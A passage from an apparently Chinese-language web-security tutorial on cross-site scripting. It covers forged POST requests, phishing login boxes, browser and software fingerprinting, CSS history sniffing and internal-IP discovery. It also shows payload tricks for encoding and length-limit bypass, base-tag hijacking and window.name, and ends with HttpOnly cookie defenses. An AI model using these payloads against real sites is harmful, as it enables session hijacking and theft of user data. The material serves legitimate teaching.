class="string">"xssform"</span>).submit();</div></pre></td></tr></table></figure></p>
<p>这样就能自动提交表单了。</p>
<p>另外使用<code>XMLHttpRequest</code>发送一个POST请求：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="string">"http://www.douban.com"</span>;</div><div class="line"><span class="keyword">var</span> postStr = <span class="string">"ck=JiUY&amp;mb_text=test1234"</span>;</div><div class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">    ajax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject)&#123;</div><div class="line">    ajax  = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">ajax.open(<span class="string">"POST"</span>,url,<span class="literal">true</span>);</div><div class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencode"</span>);</div><div class="line">ajax.send(postStr);</div><div class="line">ajax.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>(ajax.readyState == <span class="number">4</span> &amp;&amp; ajax.status == <span class="number">200</span>)&#123;</div><div class="line">        alert(<span class="string">"DONE"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这样也能提交成功。</p>
<p>通过这个例子可以知道，使用Javascript模拟浏览器发包并不是很困难的事情。</p>
<p>所以XSS攻击之后，攻击者出了可以实施Cookie劫持以外，还能模拟GET，POST请求操作用户的浏览器，这在某些隔离环境之中非常有效。</p>
<h2 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h2><p>XSS并非万能，其攻击过程都是在浏览器中通过Javascript脚本自动进行的，缺乏和用户交互的过程。</p>
<p>比如党我们需要修改用户密码的过程中，在提交新密码之前都需要用户输入Old Password，而这个Old Password往往是用户所不知道的。</p>
<p>对于验证码来说，XSS Payload能够通过读取页面内容，将验证码图片的URL发送到远程服务器或者甚至使用OCR工具就能够自动识别验证码。</p>
<p>那么如果攻击者需要获得用户的密码，最简单的方法就是使用Javascript在当前页面画出一个伪造的登陆框，当用户在登陆框中输入用户名和密码后，其密码就能过被发送到攻击者的服务器上。</p>
<h2 id="识别用户的浏览器"><a href="#识别用户的浏览器" class="headerlink" title="识别用户的浏览器"></a>识别用户的浏览器</h2><p>很多的时候，攻击者为了获得更大的利益，往往需要准确收集用户的个人信息，如果知道用户是用的浏览器，操作系统，攻击者就可以实施一次非常精准的浏览器内存攻击，最终给用户电脑植入一个木马。</p>
<p>最简单的识别方法莫过于读取浏览器的User-Agent对象：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">navigator.userAgent</div><div class="line"><span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"</span></div></pre></td></tr></table></figure></p>
<p>这个对象就能过告诉我们很多客户端的信息：</p>
<p>OS版本：linux X86_64</p>
<p>浏览器版本：Chrome 50.0.2661.102</p>
<p>但是熟悉Python爬虫的人知道，浏览器的User-Agent是可以伪造的，所以通过Javascript取出来的对象，信息不一定准确。</p>
<p>但是对于攻击者来说，还可以通过别的方法。由于浏览器之间的实现存在差异，不同的浏览器会各自实现一些独特的功能，而且不同版本的浏览器之间也会有细微的差别，所以可以根据分辨这些浏览器的差异，获得浏览器的版本，而且几乎不会被误报。</p>
<p>使用JQuery可以如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">   <span class="keyword">var</span> brow=$.browser;</div><div class="line">   <span class="keyword">var</span> bInfo=<span class="string">""</span>;</div><div class="line">   <span class="keyword">if</span>(brow.msie) &#123;bInfo=<span class="string">"Microsoft Internet Explorer "</span>+brow.version;&#125;</div><div class="line">   <span class="keyword">if</span>(brow.mozilla) &#123;bInfo=<span class="string">"Mozilla Firefox "</span>+brow.version;&#125;</div><div class="line">   <span class="keyword">if</span>(brow.safari) &#123;bInfo=<span class="string">"Apple Safari "</span>+brow.version;&#125;</div><div class="line">   <span class="keyword">if</span>(brow.opera) &#123;bInfo=<span class="string">"Opera "</span>+brow.version;&#125;</div><div class="line">      alert(bInfo);</div><div class="line">   $(<span class="string">"#browser"</span>).html(bInfo);</div><div class="line">&#125;)</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h2><p>在IE中，可以通过判定ActiveX控件的classid是否存在来推测用户是否安装了该软件，这种方法很早就被用于挂马攻击，攻击者通过判定用户安装的软件，选择对应的浏览器漏洞，最终植入木马：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">var</span> obj = <span class="keyword">new</span> ActiveXObject(<span class="string">'XunLeiBHO.ThunderIEHelper'</span>); </div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(e)&#123;</div><div class="line">    <span class="comment">// Xunlei BHO does not exist</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这段代码就能过检测迅雷的一个控件（“XunLeiBHO.ThunderIEHelper”）是否存在。如果用户安装了迅雷，那么也会安装此控件，这样就能够判定用户安装迅雷的可能性，通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。</p>
<p>同时一些第三方软件可能也会泄露一些信息，比如Flash的一个<code>system.capabilities</code>对象就能够查询客户端的一些硬件信息。</p>
<p>同事Firefox也可以查询一些插件来进行XSS，直接查询<code>navigator.plugins</code>对象就能过找到所有的插件了。</p>
<p>而对于Firefox的扩展而言，可以通过检测扩展的图片来判定某个特殊的扩展是否存在。在Firefox之中有一个特殊的协议chrome://,Firefox的扩展图标可以通过这个协议来被访问到，比如Flash Got的扩展图标可以这样访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chrome://flashgot/skin/icon32.png</div></pre></td></tr></table></figure></p>
<p>所以在扫描Firefox扩展的时候只需要在Javascript中加载这张图片就能判定扩展存在与否了。</p>
<h2 id="CSS-History-Hack"><a href="#CSS-History-Hack" class="headerlink" title="CSS History Hack"></a>CSS History Hack</h2><p>我们还可以通过XSS Payload来发现一个用户曾经访问的网站。</p>
<p>利用style的visited属性，当用户曾经访问一个链接，那么这个链接就会变得与众不同。这样就能够通过显示各种不同的网站来通过其CSS属性来判定用户是否访问过这个网站了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> websites = [...要检测的访问过的网址列表，可能有几千个...];</div><div class="line"><span class="comment">//遍历每个URL</span></div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; websites.length: i++) &#123;</div><div class="line">    <span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>);</div><div class="line">    link.id = <span class="string">"id"</span> + i;</div><div class="line">    link.href = websites[i];</div><div class="line">    link.innerHTML = websites[i];</div><div class="line"></div><div class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;style&gt;'</span>);</div><div class="line">    <span class="built_in">document</span>.write(<span class="string">'#id'</span> + i + <span class="string">":visited &#123;color:#FF0000;&#125;"</span>);</div><div class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;/style&gt;'</span>);</div><div class="line"></div><div class="line">    <span class="built_in">document</span>.body.appendChild(link);</div><div class="line">    <span class="keyword">var</span> color = <span class="built_in">document</span>.defaultView.getComputedStyle(link, <span class="literal">null</span>).getPropertyValue(<span class="string">"color"</span>);</div><div class="line">    <span class="built_in">document</span>.body.removeChild(link);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (color == <span class="string">"rgb(255,0,0)"</span>) &#123; <span class="comment">//visited</span></div><div class="line">        <span class="keyword">var</span> item = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>);</div><div class="line">        item.appendChild(link);</div><div class="line">        <span class="built_in">document</span>.getElementById(<span class="string">'visited'</span>).appendChild(item);</div><div class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//Not visited</span></div><div class="line">        <span class="keyword">var</span> item = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>);</div><div class="line">        item.appendChild(link);</div><div class="line">        <span class="built_in">document</span>.getElementById(<span class="string">'notvisited'</span>).appendChild(item);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="获取用户真实的IP地址"><a href="#获取用户真实的IP地址" class="headerlink" title="获取用户真实的IP地址"></a>获取用户真实的IP地址</h2><p>通过XSS Payload还能获取一些客户端的IP地址。</p>
<p>很多时候，用户电脑使用了代理服务器（比如VPN），或者在局域网中隐藏在NAT之后，网站看到的客户端的地址往往都是内网的出口IP地址，而并非用户电脑真实的本地地址。</p>
<p>Javascript并没有获取本地IP地址的能力，XSS就需要借助第三方软件来完成，例如，客户端安装了Java环境（JRE），那么就能过通过调用Java Applet的接口来获取客户端的本地IP地址。</p>
<p>在XSS攻击框架Attack API之中，就有一个获取本地IP地址的API：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">AttackAPI.dom.getInternalIP = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> sock = <span class="keyword">new</span> java.net.Socket();</div><div class="line">        sock.bind(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>));</div><div class="line">        sock.connect(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="built_in">document</span>.domain, (!<span class="built_in">document</span>.location.port) ? <span class="number">80</span> : <span class="built_in">document</span>.location.port));</div><div class="line">        <span class="keyword">return</span> sock.getLocalAddress().getHostAddress();</div><div class="line">    &#125; <span class="keyword">catch</span>(e) &#123;&#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">'127.0.0.1'</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>Metasploit引擎曾经展示了一个强大的测试页面，结合了Java Applet、Flash、iTunes、Office Word、QuickTime等第三方软件抓取用户的本地信息，这里是<a href="http://decloak.net/decloak.html" target="_blank" rel="external">传送门</a>。</p>
<h1 id="XSS-攻击平台"><a href="#XSS-攻击平台" class="headerlink" title="XSS 攻击平台"></a>XSS 攻击平台</h1><h2 id="Attack-API"><a href="#Attack-API" class="headerlink" title="Attack API"></a>Attack API</h2><p><a href="https://code.google.com/archive/p/attackapi/" target="_blank" rel="external">Attack API</a>是安全研究者pdp所主导的一个项目，其总结了很多能够直接使用XSS Payload，归纳为API的方式，比如上面提到的获取客户端本地信息的API。</p>
<h2 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h2><p><a href="http://beefproject.com/" target="_blank" rel="external">BeEF</a>有一个控制后台，攻击者可以在后台控制前端的一切。</p>
<p>每个被攻击的用户都会出现再后台，后台控制者可以通过控制这些浏览器的行为，并且可以通过向这些用户发送命令。</p>
<h2 id="XSS-Proxy"><a href="#XSS-Proxy" class="headerlink" title="XSS-Proxy"></a>XSS-Proxy</h2><p>是一个轻量级的攻击平台，通过嵌套<code>iframe</code>的方式可以远程控制被XSS攻击的浏览器。</p>
<h1 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h1><p>利用上面的方法，就可以使用存储性来起到传播XSS代码，从而传播蠕虫了。</p>
<h1 id="XSS构造技巧"><a href="#XSS构造技巧" class="headerlink" title="XSS构造技巧"></a>XSS构造技巧</h1><h2 id="利用字符编码"><a href="#利用字符编码" class="headerlink" title="利用字符编码"></a>利用字符编码</h2><p>百度搜藏曾经有这样一个XSS漏洞，百度在一个<script>标签中输出了一个变量，其中转义了双引号：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> redirectURL = <span class="string">"\";alert(/xss/);"</span>;</div></pre></td></tr></table></figure></p>
<p>一般来说，这样是没有XSS漏洞的，因为变量处于双引号内，系统转义了双引号导致变量无法被<code>escape</code>。</p>
<p>但是百度返回的页面是GBK/GB2312编码的，因此%c1\这个两个字符组合在一起会成为一个unicode字符，在firefox下会认为是一个字符，所以构造：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%c1<span class="string">";alert(/xss/);//</span></div></pre></td></tr></table></figure></p>
<p>这个时候firefox就会把前面两个结合，从而执行了新的unicode字符，%c1把转移符号\吃掉了，从而绕过了系统的安全检查，成功实施了XSS攻击。</p>
<h2 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h2><p>很多时候，产生XSS的地方都会有变量的长度限制，这个限制往往是服务器逻辑引发的。假设下面这个代码存在一个XSS漏洞：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input type=<span class="string">"text"</span> value=<span class="string">"$var"</span> /&gt;</div></pre></td></tr></table></figure></p>
<p>服务器端如果对输出变量<code>$var</code>做了严格的长度限制，那么攻击者可以这样构造XSS：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>希望达到的效果是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input type=<span class="string">"text"</span> value=<span class="string">""</span>&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; <span class="string">"/&gt;</span></div></pre></td></tr></table></figure></p>
<p>假设长度限制为20个字节，那么这段XSS会被切割为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$var = <span class="string">'"&gt;&lt;script&gt;alert(/xss'</span>;</div></pre></td></tr></table></figure></p>
<p>这样连一个完整的函数都没法写完，XSS攻击无法成功。但是攻击者仍然可以使用事件来缩短所需要的字节数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$var = <span class="string">'"onclick=alert(1) //'</span>;</div></pre></td></tr></table></figure></p>
<p>当用户点击了input框之后，<code>alert()</code>就会被执行。</p>
<p>但是利用事件能够缩短的字节数是有限的。最好的方法还是把XSS Payload写到别处，再通过简短的代码加载这段XSS Payload。</p>
<p>最常用的方法就是<code>location.hash</code>。而且根据HTTP协议，<code>location.hash</code>的内容并不会在HTTP包中发送，所以服务器端的Web日志并不会记录下<code>location.hash</code>的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$var = &apos;&quot;onclick=&quot;eval(location.hash.substr(1))&apos;;</div></pre></td></tr></table></figure></p>
<p>总共是40个字节。输出的HTML就变成了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input type=<span class="string">"text"</span> value=<span class="string">""</span> onclick=<span class="string">"eval(location.hash.substr(1))"</span> /&gt;</div></pre></td></tr></table></figure></p>
<p><img src="/wp-content/uploads/2016/05/XSS-on-hash.png" alt="XSS on hash"></p>
<p><code>location.hash</code>并没有长度限制，但是浏览器的地址栏长度是有限制的，不高这个长度已经很足够写很唱得代码了，如果浏览器地址栏长度也不够用，那么还可以在是用远程加载JS的方法。</p>
<p>在某些情况下，我们还是可以使用注释符来绕过长度限制。</p>
<p>比如我们可以控制两个文本框，第二个文本框允许写入更多内容，此时可以利用HTML的注释符号，吧两个文本框之间的HTML全部注释掉，从而打通两个<code>&lt;input&gt;</code>标签<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;input id=<span class="string">"1"</span> type=<span class="string">"text"</span> value=<span class="string">""</span> /&gt;</div><div class="line">XXXXXXXXXXX</div><div class="line">&lt;input id=<span class="string">"2"</span> type=<span class="string">"text"</span> value=<span class="string">""</span> /&gt;</div></pre></td></tr></table></figure></p>
<p>那么在第一个<code>input</code>框中输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;&gt;&lt;!--</div></pre></td></tr></table></figure></p>
<p>在第二个input框中输入：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>最终的效果如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;input id=<span class="string">"1"</span> type=<span class="string">"text"</span> value=<span class="string">""</span>&gt;&lt;!--<span class="string">" /&gt;</div><div class="line">XXXXXXXXXXX</div><div class="line">&lt;input id="</span><span class="number">2</span><span class="string">" type="</span>text<span class="string">" value="</span>--&gt;&lt;script&gt;alert(xss);&lt;/script&gt;<span class="string">" /&gt;</span></div></pre></td></tr></table></figure></p>
<p>在第一个input框中，仅仅使用了短短的6个字节，中间的代码全部被注释掉了，最终结果如下：<img src="/wp-content/uploads/2016/05/xss3.png" alt="xss3"></p>
<h2 id="使用base标签"><a href="#使用base标签" class="headerlink" title="使用base标签"></a>使用base标签</h2><p>base标签并不常用，其作用是定义页面上所有使用相对路径标签的hosting地址。</p>
<p>比如打开一张不存在的图片：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/int1/en_ALL/images/srpr/logo1w.png"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>在<code>&lt;img&gt;</code>标签中加入一个<code>&lt;base&gt;</code>标签：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"http://www.google.com"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/int1/en_ALL/images/srpr/logo1w.png"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><base>标签将指定其后的标签默认从<code>http://www.google.com</code>中取URL：<img src="/wp-content/uploads/2016/05/XSS4.png" alt="XSS4"></p>
<p>攻击者一旦在页面中插入了<code>&lt;base&gt;</code>标签，就可以通过远程服务器上伪造图片、链接或者脚本，劫持当前页面中所有使用相对路径的标签。</p>
<p>所以在设计安全方案的时候，需要过滤掉这个非常危险的标签。</p>
<h2 id="window-name的使用"><a href="#window-name的使用" class="headerlink" title="window.name的使用"></a>window.name的使用</h2><p><code>window.name</code>对象赋值，没有特殊字符的限制，因为<code>window</code>对象是浏览器的窗体而并非document对象，因此很多时候<code>window</code>对象不受同源策略的限制，攻击者就可以利用这个对象，实现跨域、跨页面传输数据。</p>
<p>参考下面的例子：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line">    &lt;script&gt;</div><div class="line">        window.name=<span class="string">"test"</span>;</div><div class="line">        alert(document.domain+<span class="string">" "</span>+window.name);</div><div class="line">        window.location = <span class="string">"http://www.b.com/test1.html"</span>;</div><div class="line">    &lt;/script&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure></p>
<p>这段代码将<code>window.name</code>赋值为test，然后显示当前域和<code>window.name</code>的值，最后将页面跳转到<code>www.b.com/test1.html</code>。</p>
<p>而<code>www.b.com/test1.html</code>的代码为：<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></div><div class="line">        alert(<span class="built_in">document</span>.domain+<span class="string">" "</span>+<span class="built_in">window</span>.name);</div><div class="line">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>这样就实现了数据的跨域传递test这个值就从www.a.com传递到www.b.com。</p>
<p>使用<code>window.name</code>能够缩短XSS Payload的长度。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line">    &lt;script&gt;</div><div class="line">        window.name = &quot;alert(document.cookie)&quot;;</div><div class="line">        location.href=&quot;http://www.xssedsite.com/xss.php&quot;;</div><div class="line">    &lt;/script&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure></p>
<p>在同一个窗口打开XSS站点后，只需要执行下面的代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert(name);</div></pre></td></tr></table></figure></p>
<p>只有11个字节，短到了极致。</p>
<h2 id="Anetha的回旋镖"><a href="#Anetha的回旋镖" class="headerlink" title="Anetha的回旋镖"></a>Anetha的回旋镖</h2><p>反射性XSS也有可能像储存性XSS一样利用：将要利用的反射性XSS嵌入一个存储性XSS中。</p>
<p>因为浏览器的同源策略，XSS也收到同源策略的限制：发生在A域上的XSS很难影响到B域的用户。</p>
<p>回旋镖的思路就是：如果在B域上存在一个反射型XSS_B，在A域上存在一个存储性XSS_A，当用户访问A域上的XSS_A时，同时嵌入B域上的XSS_B，则跨域达到在A域上的XSS攻击B域用户的行为。</p>
<p>在IE之中，<code>&lt;iframe&gt;</code>、<code>&lt;img&gt;</code>、<link>等标签都会拦截第三方Cookie的发送，而在Firefox中却没有限制。所以对于Firefox，只需要在XSS_A处嵌入一个<code>iframe</code>标签即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://www.b.com/?xss....&quot;&gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure></p>
<p>但是对于IE来说，则要麻烦很多，为了达到执行XSS_B的目的，可以使用一个<form>标签，在浏览器提交form的时候并不会拦截第三方Cookie的发送。</p>
<p>因此先在XSS_A上写入一个<code>&lt;form&gt;</code>，自动提交到XSS_B，然后在XSS_B中在跳转回到XSS_A，这样就完成了一个回旋镖的过程，但是这种攻击的缺点是，尽管跳转过程很短，但是用户仍然能够看到地址栏的变化。</p>
<h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><h2 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h2><p>浏览器会禁止页面访问带有<code>HttpOnly</code>属性的Cookie。</p>
<p>下面的浏览器开始支持<code>HttpOnly</code>属性：</p>
<ul>
<li>IE6 SP1+</li>
<li>Firefox 2.0.0.5+</li>
<li>Chrome</li>
<li>Safari 4.0+</li>
<li>Opera 9.5+<br>严格说来，<code>HttpOnly</code>并非为了对抗XSS，而是解决XSS之后的Cookie劫持攻击。</li>
</ul>
<p>一个Cookie的使用过程如下：</p>
<ol>
<li>浏览器向服务器发起请求，这个时候没有Cookie</li>
<li>浏览器返回的时候发送<code>Set-Cookie</code>头，并向浏览器中写入Cookie</li>
<li>在这个Cookie到期之前，浏览器访问这个域下面的所有界面，都会发送该Cookie<br><code>HttpOnly</code>是在<code>Set-Cookie</code>时标记的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Set-Cookie:&lt;name&gt;-&lt;name&gt;[;&lt;Max-Age&gt;=&lt;age&gt;]</div><div class="line">[;expire=&lt;date&gt;][;domain=&lt;domain_name&gt;]</div><div class="line">[;path=&lt;some_path&gt;][;secure][; HttpOnly];</div></pre></td></tr></table></figure>
</li>
</ol>
<p>需要注意的是，服务器可能会设置多个Cookie（<code>key</code>-<code>value</code>对），而<code>HttpOnly</code>可以有选择性的加在任何一个Cookie值上。在有些时候，应用可能需要Javascript访问几项Cookie，这种Cookie可以不设置HttpOnly标记，而只需要把HttpOnly标记给用于认证的关键的Cookie。</p>
<p>在不同的语言中，给Cookie添加的HttpOnly的代码如下：</p>
<p>Java EE<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">response.setHeader("Set-Cookie", "cookiename=value;</div><div class="line">Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");</div></pre></td></tr></table></figure></p>
<p>C#</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">HttpCookie myCookie = new HttpCookie(&quot;myCookie&quot;);   </div><div class="line">myCookie.HttpOnly = true;   </div><div class="line">Response.AppendCookie(myCookie);</div></pre></td></tr></table></figure>
<p>VB.NET<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Dim</span> myCookie <span class="keyword">As</span> HttpCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>)   </div><div class="line">myCookie.HttpOnly = <span class="literal">True</span>   </div><div class="line">Response.AppendCookie(myCookie)</div></pre></td></tr></table></figure></p>
<p>但是在.NET 1.1中需要手动添加：<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Response.Cookies[cookie].Path += <span class="string">";HTTPOnly"</span>;</div></pre></td></tr></table></figure></p>
<p>PHP 4<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">header(<span class="string">"Set-Cookie: hidden=value; httpOnly"</span>);</div></pre></td></tr></table></figure></p>
<p>PHP 5<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">setcookie(<span class="string">"abc"</span>, <span class="string">"test"</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">NULL</span>, <span class="keyword">TRUE</span>);</div></pre></td></tr></table></figure></p>
<p>最后一个参数为HttpOnly属性。</p>
